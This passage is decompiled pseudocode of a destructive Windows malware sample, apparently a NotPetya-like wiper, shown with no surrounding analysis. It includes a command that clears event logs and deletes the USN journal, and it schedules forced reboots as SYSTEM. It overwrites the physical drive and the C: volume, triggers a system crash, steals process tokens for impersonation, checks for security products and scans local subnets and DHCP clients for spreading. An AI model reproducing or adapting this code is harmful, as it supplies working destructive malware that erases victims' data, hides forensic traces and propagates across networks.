    }
    Sleep(60000 * hThread);
    if ( EnumeratedProcessesHandle & 0x10 )
      CheckDriveAndPubKey();
    Sleep(60000 * dwErrCode);
    if ( gPrivLevel & 2
      || (memset(&Dst, 0, 0x114u), Dst = 276, !GetVersionExW(&Dst))
      || (v19 != 5 || v20 != 1 && v20 != 2) && (v19 != 6 || v20 && v20 != 1)
      || (sub_681F6BB0(v14), !SelfLocalHostCheck(a1, a2, v14)) )
    {
      Sleep(60000 * a3);
      wsprintfW(
        &v15,
        L"wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D %c:",
        pszPath);
      v16 = 0;
      LaunchCMDProcess(&v15, 3);
      if ( gPrivLevel & 1 )
      {
        v12 = GetModuleHandleA("ntdll.dll");
        if ( v12 )
        {
          v13 = GetProcAddress(v12, "NtRaiseHardError");
          if ( v13 )
            (v13)(-1073740976, 0, 0, 0, 6, &Thread);
        }
        if ( !InitiateSystemShutdownExW(0, 0, 0, 1, 1, 0x80000000) )
          ExitWindowsEx(6u, 0);
      }
    }
    ExitProcess(0);
  }
  v7 = &Src;
  a3 = v6;
  while ( 1 )
  {
    Token = *v7;
    Thread = 0;
    dwErrCode = 0;
    Thread = CreateThread(0, 0, sub_681F9F8E, 0, 4u, 0);
    if ( !Thread )
    {
      dwErrCode = 87;
      goto LABEL_20;
    }
    if ( !SetThreadToken(&Thread, Token) )
      break;
    if ( ResumeThread(Thread) == -1 )
      goto LABEL_18;
LABEL_20:
    SetLastError(dwErrCode);
    dwErrCode = *v7;
    Thread = 0;
    hThread = CreateThread(0, 0, SetThreadParam, &Thread, 4u, 0);
    if ( hThread )
    {
      if ( SetThreadToken(&hThread, dwErrCode) )
      {
        if ( ResumeThread(hThread) == -1 )
          GetLastError();
        else
          WaitForSingleObject(hThread, 0xFFFFFFFF);
      }
      CloseHandle(hThread);
    }
    if ( Thread )
      EnumerateProcessHeap(dword_6820F110, v7, 0);
    ++v7;
    if ( !--a3 )
      goto LABEL_29;
  }
  dwErrCode = GetLastError();
LABEL_18:
  CloseHandle(Thread);
  goto LABEL_20;
}
// 6820F104: using guessed type int EnumeratedProcessesHandle;
// 6820F144: using guessed type int gPrivLevel;

//----- (681F81BA) --------------------------------------------------------
BOOL __stdcall CheckPrivsAdjustTokens(LPCWSTR lpName)
{
  BOOL v1; // ebx
  HANDLE v2; // eax
  struct _TOKEN_PRIVILEGES NewState; // [esp+Ch] [ebp-18h]
  DWORD dwErrCode; // [esp+1Ch] [ebp-8h]
  HANDLE TokenHandle; // [esp+20h] [ebp-4h]

  NewState.PrivilegeCount = 0;
  NewState.Privileges[0].Luid.LowPart = 0;
  NewState.Privileges[0].Luid.HighPart = 0;
  NewState.Privileges[0].Attributes = 0;
  v1 = 0;
  dwErrCode = 0;
  TokenHandle = 0;
  v2 = GetCurrentProcess();
  if ( OpenProcessToken(v2, 0x28u, &TokenHandle) )
  {
    if ( LookupPrivilegeValueW(0, lpName, NewState.Privileges) )
    {
      NewState.PrivilegeCount = 1;
      NewState.Privileges[0].Attributes = 2;
      v1 = AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0, 0, 0);
      dwErrCode = GetLastError();
      if ( dwErrCode )
        v1 = 0;
    }
  }
  SetLastError(dwErrCode);
  return v1;
}

//----- (681F8243) --------------------------------------------------------
signed int FreeNetApiBuffer()
{
  signed int v0; // esi
  int v1; // eax
  LPBYTE bufptr; // [esp+4h] [ebp-4h]

  v0 = 0;
  bufptr = 0;
  if ( !NetServerGetInfo(0, 0x65u, &bufptr) )
  {
    v1 = *(bufptr + 4);
    if ( v1 & 0x8000 || v1 & 0x18 )
      v0 = 1;
  }
  if ( bufptr )
    NetApiBufferFree(bufptr);
  return v0;
}

//----- (681F8282) --------------------------------------------------------
unsigned int *__stdcall GetNetServerInfo(int *a1, unsigned int *a2, unsigned int *a3, int *a4)
{
  unsigned int v4; // edi
  signed int v5; // ebx
  int v6; // esi
  unsigned int v7; // eax
  int v8; // ecx
  unsigned int *result; // eax
  LPBYTE bufptr; // [esp+Ch] [ebp-4h]

  v4 = ReturnTimeIfTimePassed();
  v5 = 0;
  v6 = v4 > 0x55 ? v4 - 85 : 0;
  bufptr = 0;
  if ( !NetServerGetInfo(0, 0x65u, &bufptr) && bufptr[16] & 0x18 )
    v5 = 1;
  if ( bufptr )
    NetApiBufferFree(bufptr);
  if ( v5 )
    v4 += 15;
  v7 = v4 / 3;
  if ( v4 <= 0x55 )
    v8 = v4 > 0xF ? v4 - 15 : 0;
  else
    v8 = 70;
  if ( v4 > 0xF )
    v4 = 15;
  if ( a1 )
    *a1 = v6;
  if ( a3 )
    *a3 = v7;
  if ( a4 )
    *a4 = v8;
  result = a2;
  if ( a2 )
    *a2 = v4;
  return result;
}

//----- (681F8320) --------------------------------------------------------
int __stdcall PathCombineWithCWindows(LPWSTR pszDest)
{
  signed int v1; // esi
  const WCHAR *v2; // eax
  LPWSTR v3; // eax

  v1 = 0;
  v2 = PathFindFileNameW(&pszPath);
  if ( PathCombineW(pszDest, L"C:\\Windows\\", v2) )
  {
    v3 = PathFindExtensionW(pszDest);
    if ( v3 )
    {
      *v3 = 0;
      v1 = 1;
    }
  }
  return v1;
}

//----- (681F835E) --------------------------------------------------------
BOOL SomeFileCheck()
{
  BOOL v0; // esi
  WCHAR pszPath; // [esp+4h] [ebp-618h]

  v0 = 0;
  if ( PathCombineWithCWindows(&pszPath) )
  {
    if ( PathFileExistsW(&pszPath) )
      ExitProcess(0);
    v0 = CreateFileW(&pszPath, 0x40000000u, 0, 0, 2u, 0x4000000u, 0) + 1 != 0;
  }
  return v0;
}

//----- (681F83BD) --------------------------------------------------------
BOOL __userpurge LaunchCMDProcess@<eax>(int a1@<eax>, int a2)
{
  int v2; // esi
  BOOL v3; // edi
  signed int v4; // ecx
  struct _PROCESS_INFORMATION *v5; // eax
  signed int v6; // edx
  struct _STARTUPINFOW *v7; // eax
  WCHAR CommandLine; // [esp+Ch] [ebp-E6Ch]
  WCHAR Buffer; // [esp+80Ch] [ebp-66Ch]
  struct _STARTUPINFOW StartupInfo; // [esp+E24h] [ebp-54h]
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+E68h] [ebp-10h]

  v2 = a1;
  v3 = 0;
  wsprintfW(&CommandLine, L"/c %ws", a1);
  *(v2 + 2046) = 0;
  if ( GetEnvironmentVariableW(L"ComSpec", &Buffer, 0x30Cu)
    || GetSystemDirectoryW(&Buffer, 0x30Cu) && lstrcatW(&Buffer, L"\\cmd.exe") )
  {
    v4 = 16;
    v5 = &ProcessInformation;
    do
    {
      LOBYTE(v5->hProcess) = 0;
      v5 = (v5 + 1);
      --v4;
    }
    while ( v4 );
    v6 = 68;
    v7 = &StartupInfo;
    do
    {
      LOBYTE(v7->cb) = 0;
      v7 = (v7 + 1);
      --v6;
    }
    while ( v6 );
    StartupInfo.cb = 68;
    v3 = CreateProcessW(&Buffer, &CommandLine, 0, 0, 0, 0x8000000u, 0, 0, &StartupInfo, &ProcessInformation);
    if ( v3 )
      Sleep(1000 * a2);
  }
  return v3;
}

//----- (681F8494) --------------------------------------------------------
signed int GetversionInfo()
{
  signed int v0; // edi
  int Dst; // [esp+4h] [ebp-114h]
  unsigned int v3; // [esp+8h] [ebp-110h]

  v0 = 0;
  memset(&Dst, 0, 0x114u);
  Dst = 276;
  if ( GetVersionExW(&Dst) && v3 > 5 )
    v0 = 1;
  return v0;
}

//----- (681F84DF) --------------------------------------------------------
BOOL CreateScheduledTaskAsAdmin()
{
  BOOL v0; // ebx
  unsigned int v1; // eax
  unsigned int v2; // esi
  unsigned int v3; // edi
  const wchar_t *v4; // eax
  WCHAR v6; // [esp+Ch] [ebp-E28h]
  __int16 v7; // [esp+80Ah] [ebp-62Ah]
  WCHAR Buffer; // [esp+80Ch] [ebp-628h]
  struct _SYSTEMTIME SystemTime; // [esp+E24h] [ebp-10h]

  v0 = 0;
  GetLocalTime(&SystemTime);
  v1 = ReturnTimeIfTimePassed();
  if ( v1 < 0xA )
    v1 = 10;
  v2 = (v1 + 3) % 0x3C + SystemTime.wMinute;
  v3 = ((v1 + 3) / 0x3C + SystemTime.wHour) % 0x18;
  if ( GetSystemDirectoryW(&Buffer, 0x30Cu) && PathAppendW(&Buffer, L"shutdown.exe /r /f") )
  {
    if ( GetversionInfo() )
    {
      v4 = L"/RU \"SYSTEM\" ";
      if ( !(gPrivLevel & 4) )
        v4 = &unk_68204388;
      wsprintfW(&v6, L"schtasks %ws/Create /SC once /TN \"\" /TR \"%ws\" /ST %02d:%02d", v4, &Buffer, v3, v2);
    }
    else
    {
      wsprintfW(&v6, L"at %02d:%02d %ws", v3, v2, &Buffer);
    }
    v7 = 0;
    v0 = LaunchCMDProcess(&v6, 0);
  }
  return v0;
}
// 6820436C: using guessed type wchar_t aRuSystem[14];
// 6820F144: using guessed type int gPrivLevel;

//----- (681F85D0) --------------------------------------------------------
int __userpurge LoadAndLock@<eax>(void **a1@<ebx>, __m64 mm0_0@<mm0>, __m64 a3@<mm1>, int a2, HRSRC hResInfo)
{
  HGLOBAL v5; // eax
  HRSRC *v6; // esi
  HRSRC v7; // ST0C_4
  HANDLE v8; // eax
  void *v9; // eax
  void *v10; // ST0C_4
  HANDLE v11; // eax
  DWORD v13; // [esp+0h] [ebp-8h]
  signed int v14; // [esp+4h] [ebp-4h]

  v14 = 0;
  v5 = LoadResource(Src, hResInfo);
  if ( v5 )
  {
    v6 = LockResource(v5);
    if ( v6 )
    {
      v13 = SizeofResource(Src, hResInfo);
      if ( v13 )
      {
        v7 = *v6;
        v8 = GetProcessHeap();
        v9 = HeapAlloc(v8, 8u, v7);
        *a1 = v9;
        if ( v9 )
        {
          hResInfo = *v6;
          if ( SomeVersionCheck(mm0_0, a3, v9, &hResInfo, (v6 + 1), v13 - 4) )
          {
            v10 = *a1;
            v11 = GetProcessHeap();
            HeapFree(v11, 0, v10);
          }
          else
          {
            if ( a2 )
              *a2 = hResInfo;
            v14 = 1;
          }
        }
      }
    }
  }
  return v14;
}

//----- (681F8677) --------------------------------------------------------
int EnumerateProcesses()
{
  unsigned int v0; // ebx
  unsigned int v1; // kr00_4
  unsigned int v2; // edx
  unsigned int v3; // esi
  _BYTE *v4; // ecx
  char v5; // al
  PROCESSENTRY32W pe; // [esp+0h] [ebp-238h]
  HANDLE hSnapshot; // [esp+22Ch] [ebp-Ch]
  int v9; // [esp+230h] [ebp-8h]
  int v10; // [esp+234h] [ebp-4h]

  v10 = -1;
  hSnapshot = CreateToolhelp32Snapshot(2u, 0);
  if ( hSnapshot != -1 )
  {
    pe.dwSize = 556;
    if ( Process32FirstW(hSnapshot, &pe) )
    {
      do
      {
        v9 = 305419896;
        v0 = 0;
        v1 = wcslen(pe.szExeFile);
        do
        {
          v2 = 0;
          if ( v1 )
          {
            v3 = v0;
            do
            {
              v4 = &v9 + (v3 & 3);
              v5 = (*v4 ^ LOBYTE(pe.szExeFile[v2++])) - 1;
              ++v3;
              *v4 = v5;
            }
            while ( v2 < v1 );
          }
          ++v0;
        }
        while ( v0 < 3 );
        if ( v9 == 773933892 )
        {
          v10 &= 0xFFFFFFF7;
        }
        else if ( v9 == 1677939326 || v9 == 1696280581 )
        {
          v10 &= 0xFFFFFFFB;
        }
      }
      while ( Process32NextW(hSnapshot, &pe) );
    }
    CloseHandle(hSnapshot);
  }
  return v10;
}

//----- (681F875A) --------------------------------------------------------
unsigned int __stdcall EnumerateProcessesAndTokens(int a1)
{
  HANDLE v1; // eax
  HANDLE v2; // eax
  int v3; // edi
  int v4; // eax
  int v5; // eax
  int v6; // ecx
  unsigned int v8; // [esp+10h] [ebp-1290h]
  HANDLE TokenHandle; // [esp+14h] [ebp-128Ch]
  unsigned int v10; // [esp+18h] [ebp-1288h]
  HANDLE phNewToken; // [esp+1Ch] [ebp-1284h]
  int TokenInformation; // [esp+20h] [ebp-1280h]
  HANDLE hSnapshot; // [esp+24h] [ebp-127Ch]
  DWORD ReturnLength; // [esp+28h] [ebp-1278h]
  HANDLE hObject; // [esp+2Ch] [ebp-1274h]
  int v16; // [esp+30h] [ebp-1270h]
  int v17; // [esp+34h] [ebp-126Ch]
  char v18; // [esp+38h] [ebp-1268h]
  int v19; // [esp+40h] [ebp-1260h]
  PROCESSENTRY32W pe; // [esp+70h] [ebp-1230h]
  int v21; // [esp+2A0h] [ebp-1000h]
  char Dst; // [esp+2A4h] [ebp-FFCh]

  v10 = 0;
  ReturnLength = 0;
  v21 = 0;
  memset(&Dst, 0, 0xFFCu);
  v8 = 0;
  v17 = GetversionInfo();
  v1 = CreateToolhelp32Snapshot(2u, 0);
  hSnapshot = v1;
  if ( v1 != -1 )
  {
    pe.dwSize = 556;
    if ( Process32FirstW(v1, &pe) )
    {
      v16 = a1 - &v21;
      do
      {
        TokenInformation = -1;
        TokenHandle = 0;
        phNewToken = 0;
        v2 = OpenProcess(0x450u, 0, pe.th32ProcessID);
        hObject = v2;
        if ( v2 )
        {
          if ( OpenProcessToken(v2, 0x2000000u, &TokenHandle)
            && GetTokenInformation(TokenHandle, TokenSessionId, &TokenInformation, 4u, &ReturnLength)
            && (!v17 || TokenInformation) )
          {
            if ( DuplicateTokenEx(TokenHandle, 0x2000000u, 0, SecurityImpersonation, TokenImpersonation, &phNewToken) )
            {
              memset(&v18, 0, 0x38u);
              if ( GetTokenInformation(phNewToken, TokenStatistics, &v18, 0x38u, &ReturnLength) )
              {
                v3 = v19;
                v4 = 0;
                if ( v8 <= 0 )
                {
LABEL_14:
                  if ( SetTokenInformation(phNewToken, TokenSessionId, &TokenInformation, 4u) )
                  {
                    v5 = 4 * v8;
                    v6 = 4 * v8 + v16;
                    ++v10;
                    ++v8;
                    *(&v21 + v6) = phNewToken;
                    *(&v21 + v5) = v3;
                  }
                }
                else
                {
                  while ( *(&v21 + v4) != v19 )
                  {
                    if ( ++v4 >= v8 )
                      goto LABEL_14;
                  }
                }
              }
            }
          }
          CloseHandle(TokenHandle);
          CloseHandle(hObject);
        }
      }
      while ( v10 < 0x40 && Process32NextW(hSnapshot, &pe) );
    }
    else
    {
      GetLastError();
    }
    CloseHandle(hSnapshot);
  }
  return v10;
}

//----- (681F8946) --------------------------------------------------------
signed int __userpurge CreateSomeFile_2@<eax>(DWORD a1@<ebx>, const WCHAR *lpFileName, LPCVOID lpBuffer, DWORD NumberOfBytesWritten)
{
  signed int v4; // esi
  HANDLE v5; // edi

  v4 = 0;
  v5 = CreateFileW(lpFileName, 0x40000000u, 0, 0, (NumberOfBytesWritten != 0) + 1, 0, 0);
  if ( v5 != -1 )
  {
    if ( WriteFile(v5, lpBuffer, a1, &NumberOfBytesWritten, 0) && NumberOfBytesWritten == a1 )
      v4 = 1;
    CloseHandle(v5);
  }
  return v4;
}

//----- (681F8999) --------------------------------------------------------
signed int __userpurge GetDllHostData@<eax>(__m64 mm0_0@<mm0>, __m64 a2@<mm1>, int a1)
{
  HRSRC v3; // eax
  int v4; // eax
  HANDLE v5; // eax
  WCHAR *v6; // eax
  UINT v7; // eax
  LPWSTR v8; // ST10_4
  HANDLE v9; // eax
  int v10; // ecx
  _BYTE *i; // eax
  void *v12; // ST10_4
  HANDLE v13; // eax
  signed int v15; // [esp+8h] [ebp-10h]
  DWORD dwErrCode; // [esp+Ch] [ebp-Ch]
  int v17; // [esp+10h] [ebp-8h]
  LPVOID lpMem; // [esp+14h] [ebp-4h]

  dwErrCode = 0;
  v15 = 0;
  lpMem = 0;
  v17 = 0;
  v3 = FindResourceW(Src, 3, 0xA);
  if ( v3 )
    v4 = LoadAndLock(&lpMem, mm0_0, a2, &v17, v3);
  else
    v4 = 0;
  if ( !v4 )
    goto LABEL_21;
  v5 = GetProcessHeap();
  v6 = HeapAlloc(v5, 8u, 0x208u);
  ::lpMem = v6;
  if ( a1 )
  {
    v7 = GetWindowsDirectoryW(v6, 0x104u);
  }
  else
  {
    if ( SHGetFolderPathW(0, 35, 0, 0, v6) )
      goto LABEL_12;
    v7 = wcslen(::lpMem);
  }
  if ( v7 && v7 + 12 < 0x104 )
  {
    PathAppendW(::lpMem, L"dllhost.dat");
    goto LABEL_13;
  }
LABEL_12:
  v8 = ::lpMem;
  v9 = GetProcessHeap();
  HeapFree(v9, 0, v8);
  ::lpMem = 0;
LABEL_13:
  if ( ::lpMem )
  {
    if ( CreateSomeFile_2(v17, ::lpMem, lpMem, 0) )
    {
LABEL_17:
      v15 = 1;
      goto LABEL_18;
    }
    dwErrCode = GetLastError();
    if ( dwErrCode == 80 )
    {
      dwErrCode = 0;
      goto LABEL_17;
    }
  }
LABEL_18:
  v10 = v17;
  for ( i = lpMem; v10; --v10 )
    *i++ = 0;
  v12 = lpMem;
  v13 = GetProcessHeap();
  HeapFree(v13, 0, v12);
LABEL_21:
  SetLastError(dwErrCode);
  return v15;
}

//----- (681F8ACF) --------------------------------------------------------
signed int CreateSomeFile()
{
  HANDLE v0; // eax
  DWORD v1; // eax
  DWORD v2; // esi
  SIZE_T v3; // ST10_4
  HANDLE v4; // eax
  void *v5; // ebx
  HANDLE v6; // eax
  signed int v8; // [esp+4h] [ebp-Ch]
  HANDLE hFile; // [esp+8h] [ebp-8h]
  DWORD NumberOfBytesRead; // [esp+Ch] [ebp-4h]

  v8 = 0;
  v0 = CreateFileW(&pszPath, 0x80000000, 1u, 0, 3u, 0, 0);
  hFile = v0;
  if ( v0 != -1 )
  {
    v1 = GetFileSize(v0, 0);
    v2 = v1;
    if ( v1 )
    {
      v3 = v1;
      v4 = GetProcessHeap();
      v5 = HeapAlloc(v4, 0, v3);
      if ( v5 )
      {
        NumberOfBytesRead = 0;
        if ( ReadFile(hFile, v5, v2, &NumberOfBytesRead, 0) || NumberOfBytesRead != v2 )
        {
          dword_6820F0FC = v5;
          dword_6820F11C = v2;
          v8 = 1;
        }
        else
        {
          v6 = GetProcessHeap();
          HeapFree(v6, 0, v5);
        }
      }
    }
    CloseHandle(hFile);
  }
  return v8;
}

//----- (681F8B70) --------------------------------------------------------
signed int __stdcall FindFileByName(int a1)
{
  signed int v1; // edi
  LPWSTR v2; // eax
  int v3; // edx
  unsigned __int16 v4; // cx

  v1 = 0;
  if ( a1 )
  {
    v2 = PathFindFileNameW(&pszPath);
    if ( v2 )
    {
      if ( wcslen(v2) < 0x104 )
      {
        v3 = a1 - v2;
        do
        {
          v4 = *v2;
          *(v2 + v3) = *v2;
          ++v2;
        }
        while ( v4 );
        v1 = 1;
      }
    }
  }
  return v1;
}

//----- (681F8BC6) --------------------------------------------------------
signed int CheckSecurityAuthorityAndTokens()
{
  HANDLE v0; // eax
  PSID *v1; // edi
  unsigned int v2; // ebx
  PSID *v3; // esi
  PUCHAR v4; // eax
  PDWORD v5; // eax
  DWORD v6; // eax
  signed int v8; // [esp+4h] [ebp-Ch]
  HANDLE TokenHandle; // [esp+8h] [ebp-8h]
  DWORD ReturnLength; // [esp+Ch] [ebp-4h]

  v8 = 0;
  TokenHandle = 0;
  v0 = GetCurrentThread();
  if ( OpenThreadToken(v0, 0x20008u, 1, &TokenHandle) )
  {
    ReturnLength = 0;
    if ( !GetTokenInformation(TokenHandle, TokenGroups, 0, 0, &ReturnLength) && GetLastError() == 122 )
    {
      v1 = GlobalAlloc(0x40u, ReturnLength);
      if ( v1 )
      {
        if ( GetTokenInformation(TokenHandle, TokenGroups, v1, ReturnLength, &ReturnLength) )
        {
          v2 = 0;
          if ( *v1 )
          {
            v3 = v1 + 1;
            do
            {
              if ( v8 )
                break;
              v4 = GetSidSubAuthorityCount(*v3);
              if ( v4 )
              {
                if ( *v4 >= 4u )
                {
                  v5 = GetSidSubAuthority(*v3, 4u);
                  if ( v5 )
                  {
                    v6 = *v5;
                    if ( v6 == 512 || v6 == 519 )
                      v8 = 1;
                  }
                }
              }
              ++v2;
              v3 += 2;
            }
            while ( v2 < *v1 );
          }
        }
        else
        {
          GetLastError();
        }
        GlobalFree(v1);
      }
      else
      {
        GetLastError();
      }
    }
    CloseHandle(TokenHandle);
  }
  else
  {
    GetLastError();
  }
  return v8;
}

//----- (681F8CBF) --------------------------------------------------------
signed int EnumPhysDriv0()
{
  HANDLE v0; // ebx
  char OutBuffer; // [esp+10h] [ebp-20h]
  int v3; // [esp+24h] [ebp-Ch]
  LPCVOID lpBuffer; // [esp+28h] [ebp-8h]
  DWORD BytesReturned; // [esp+2Ch] [ebp-4h]

  v0 = CreateFileA("\\\\.\\PhysicalDrive0", 0x40000000u, 3u, 0, 3u, 0, 0);
  if ( !v0 )
    return 0;
  DeviceIoControl(v0, 0x70000u, 0, 0, &OutBuffer, 0x18u, &BytesReturned, 0);
  lpBuffer = LocalAlloc(0, 10 * v3);
  if ( lpBuffer )
  {
    DeviceIoControl(v0, 0x90020u, 0, 0, 0, 0, &BytesReturned, 0);
    WriteFile(v0, lpBuffer, 10 * v3, &BytesReturned, 0);
    LocalFree(lpBuffer);
  }
  CloseHandle(v0);
  return 1;
}

//----- (681F8D5A) --------------------------------------------------------
int SetLockAtCDir()
{
  HANDLE v0; // edi
  HLOCAL v1; // ebx
  int result; // eax
  DWORD BytesReturned; // [esp+Ch] [ebp-1Ch]
  char OutBuffer; // [esp+10h] [ebp-18h]
  LONG lDistanceToMove; // [esp+24h] [ebp-4h]

  v0 = CreateFileA("\\\\.\\C:", 0x40000000u, 3u, 0, 3u, 0, 0);
  if ( v0 )
  {
    if ( DeviceIoControl(v0, 0x70000u, 0, 0, &OutBuffer, 0x18u, &BytesReturned, 0) )
    {
      v1 = LocalAlloc(0, 10 * lDistanceToMove);
      if ( v1 )
      {
        SetFilePointer(v0, lDistanceToMove, 0, 0);
        WriteFile(v0, v1, lDistanceToMove, &BytesReturned, 0);
        LocalFree(v1);
      }
    }
    CloseHandle(v0);
  }
  if ( !(EnumeratedProcessesHandle & 8) || (result = RunCryptWriteMBR()) != 0 )
    result = EnumPhysDriv0();
  return result;
}
// 6820F104: using guessed type int EnumeratedProcessesHandle;

//----- (681F8E04) --------------------------------------------------------
DWORD __stdcall Unk_ConvertIPAddress(LPVOID lpThreadParameter)
{
  struct _RTL_CRITICAL_SECTION **v1; // esi
  u_long v2; // ebx
  int v3; // eax
  u_long v4; // eax
  char *v5; // eax
  char *v6; // eax
  char *v7; // ebx
  HANDLE v8; // eax
  u_long v10; // [esp+Ch] [ebp-8h]
  u_long v11; // [esp+10h] [ebp-4h]

  v1 = lpThreadParameter;
  v2 = *lpThreadParameter;
  v11 = *lpThreadParameter;
  v10 = *(lpThreadParameter + 1);
  if ( *lpThreadParameter < v10 )
  {
    do
    {
      v3 = ntohl(v2);
      if ( CheckIfDataWasSent(v3) )
      {
        v4 = ntohl(v2);
        v5 = inet_ntoa(v4);
        v6 = ConvertHeapMToWBytes(v5);
        v7 = v6;
        if ( v6 )
        {
          sub_681F6FC7(v6, 0, v1[2]);
          v8 = GetProcessHeap();
          HeapFree(v8, 0, v7);
          v1 = lpThreadParameter;
        }
      }
      v2 = v11 + 1;
      v11 = v2;
    }
    while ( v2 < v10 );
  }
  LocalFree(v1);
  return 0;
}

//----- (681F8E7F) --------------------------------------------------------
DWORD __stdcall GetNetworkInterfaces(LPVOID lpThreadParameter)
{
  unsigned int v1; // ebx
  struct _IP_ADAPTER_INFO *v2; // edi
  char *v3; // eax
  HANDLE v4; // eax
  char *v5; // eax
  HANDLE v6; // eax
  _DWORD *v7; // esi
  unsigned __int32 v8; // eax
  int v9; // edx
  int v10; // ecx
  HANDLE v11; // eax
  unsigned int v13; // [esp+Ch] [ebp-3014h]
  unsigned int v14; // [esp+10h] [ebp-3010h]
  char *lpMem; // [esp+14h] [ebp-300Ch]
  char *lpMema; // [esp+14h] [ebp-300Ch]
  LPVOID lpMemb; // [esp+14h] [ebp-300Ch]
  ULONG SizePointer; // [esp+18h] [ebp-3008h]
  HLOCAL hMem; // [esp+1Ch] [ebp-3004h]
  HANDLE hObject; // [esp+20h] [ebp-3000h]
  char Dst; // [esp+24h] [ebp-2FFCh]
  int v22; // [esp+1020h] [ebp-2000h]
  int v23[2047]; // [esp+1024h] [ebp-1FFCh]

  v1 = 0;
  hObject = 0;
  memset(&Dst, 0, 0xFFCu);
  v22 = 0;
  memset(v23, 0, 0x1FFCu);
  SizePointer = 0;
  v13 = 0;
  v14 = 0;
  if ( GetAdaptersInfo(0, &SizePointer) == 111 )
  {
    v2 = LocalAlloc(0x40u, SizePointer);
    hMem = v2;
    if ( v2 )
    {
      if ( !GetAdaptersInfo(v2, &SizePointer) )
      {
        do
        {
          if ( v13 >= 0x400 )
            break;
          *(&v22 + 2 * v13) = inet_addr(v2->IpAddressList.IpAddress.String);
          v23[2 * v13] = inet_addr(v2->IpAddressList.IpMask.String);
          v3 = ConvertHeapMToWBytes(v2->IpAddressList.IpAddress.String);
          lpMem = v3;
          if ( v3 )
          {
            sub_681F6FC7(v3, 1, lpThreadParameter);
            v4 = GetProcessHeap();
            HeapFree(v4, 0, lpMem);
          }
          if ( v2->DhcpEnabled )
          {
            v5 = ConvertHeapMToWBytes(v2->DhcpServer.IpAddress.String);
            lpMema = v5;
            if ( v5 )
            {
              sub_681F6FC7(v5, 0, lpThreadParameter);
              v6 = GetProcessHeap();
              HeapFree(v6, 0, lpMema);
            }
          }
          v2 = v2->Next;
          ++v13;
        }
        while ( v2 );
        if ( FreeNetApiBuffer() )
          EnumerateHostNameAndIP_2(lpThreadParameter);
        if ( v13 > 0 )
        {
          do
          {
            v7 = LocalAlloc(0x40u, 0xCu);
            if ( v7 )
            {
              v8 = inet_addr("255.255.255.255");
              v9 = v23[2 * v14];
              v10 = v9 & *(&v22 + 2 * v14);
              if ( v9 & *(&v22 + 2 * v14) )
              {
                lpMemb = (v10 | v9 ^ v8);
                if ( lpMemb )
                {
                  *v7 = ntohl(v10);
                  v7[1] = ntohl(lpMemb);
                  v7[2] = lpThreadParameter;
                  v11 = CreateThread(0, 0, Unk_ConvertIPAddress, v7, 0, 0);
                  if ( v11 )
                    *(&hObject + v14) = v11;
                }
              }
            }
            ++v14;
          }
          while ( v14 < v13 );
        }
        if ( v14 > 0 )
        {
          do
            CloseHandle(*(&hObject + v1++));
          while ( v1 < v14 );
        }
      }
      LocalFree(hMem);
    }
  }
  return 0;
}
// 681F8E7F: using guessed type int var_1FFC[2047];

//----- (681F908A) --------------------------------------------------------
int __stdcall EnumerateHostNameAndIP_2(int a1)
{
  unsigned int v1; // ebx
  unsigned int v2; // esi
  DWORD v3; // eax
  LPDHCP_CLIENT_INFO v4; // esi
  int v5; // eax
  u_long v6; // eax
  char *v7; // eax
  char *v8; // eax
  char *v9; // ebx
  HANDLE v10; // eax
  WCHAR Buffer; // [esp+10h] [ebp-244h]
  DWORD ClientsTotal; // [esp+218h] [ebp-3Ch]
  DWORD v14; // [esp+21Ch] [ebp-38h]
  DWORD nSize; // [esp+220h] [ebp-34h]
  unsigned int v16; // [esp+224h] [ebp-30h]
  DHCP_RESUME_HANDLE ResumeHandle; // [esp+228h] [ebp-2Ch]
  DHCP_RESUME_HANDLE v18; // [esp+22Ch] [ebp-28h]
  DWORD ElementsTotal; // [esp+230h] [ebp-24h]
  DWORD ClientsRead; // [esp+234h] [ebp-20h]
  DWORD ElementsRead; // [esp+238h] [ebp-1Ch]
  unsigned int v22; // [esp+23Ch] [ebp-18h]
  unsigned int v23; // [esp+240h] [ebp-14h]
  LPDHCP_SUBNET_INFO SubnetInfo; // [esp+244h] [ebp-10h]
  LPDHCP_CLIENT_INFO_ARRAY ClientInfo; // [esp+248h] [ebp-Ch]
  LPDHCP_IP_ARRAY EnumInfo; // [esp+24Ch] [ebp-8h]

  v1 = 0;
  v2 = 0;
  ResumeHandle = 0;
  v18 = 0;
  EnumInfo = 0;
  SubnetInfo = 0;
  ClientInfo = 0;
  v22 = 0;
  v23 = 0;
  ElementsRead = 0;
  ElementsTotal = 0;
  ClientsRead = 0;
  ClientsTotal = 0;
  nSize = 260;
  GetComputerNameExW(ComputerNamePhysicalNetBIOS, &Buffer, &nSize);
  if ( !DhcpEnumSubnets(&Buffer, &ResumeHandle, 0x400u, &EnumInfo, &ElementsRead, &ElementsTotal) )
  {
    v14 = EnumInfo->NumElements;
    if ( v14 > 0 )
    {
      do
      {
        if ( !DhcpGetSubnetInfo(0, EnumInfo->Elements[v1], &SubnetInfo)
          && SubnetInfo->SubnetState == DhcpSubnetEnabled
          && !DhcpEnumSubnetClients(0, EnumInfo->Elements[v1], &v18, 0x10000u, &ClientInfo, &ClientsRead, &ClientsTotal) )
        {
          v3 = ClientInfo->NumElements;
          v16 = v3;
          if ( v3 && v2 < v3 )
          {
            do
            {
              v4 = ClientInfo->Clients[v2];
              if ( v4 )
              {
                v5 = ntohl(v4->ClientIpAddress);
                if ( CheckIfDataWasSent(v5) )
                {
                  v6 = ntohl(v4->ClientIpAddress);
                  v7 = inet_ntoa(v6);
                  v8 = ConvertHeapMToWBytes(v7);
                  v9 = v8;
                  if ( v8 )
                  {
                    sub_681F6FC7(v8, 0, a1);
                    v10 = GetProcessHeap();
                    HeapFree(v10, 0, v9);
                  }
                }
              }
              v2 = v23 + 1;
              v23 = v2;
            }
            while ( v2 < v16 );
          }
          DhcpRpcFreeMemory(ClientInfo);
        }
        v1 = v22 + 1;
        v22 = v1;
      }
      while ( v1 < v14 );
    }
    DhcpRpcFreeMemory(EnumInfo);
  }
  return 0;
}

//----- (681F91FA) --------------------------------------------------------
signed int __thiscall sub_681F91FA(int this, int a2)
{
  int v2; // edx
  int v3; // edi
  __int16 *v4; // esi
  __int16 v5; // dx
  signed int i; // [esp+0h] [ebp-8h]
  unsigned int v8; // [esp+4h] [ebp-4h]

  v2 = *this;
  for ( i = 1; *this; v2 = *this )
  {
    if ( !i )
      break;
    v8 = 0;
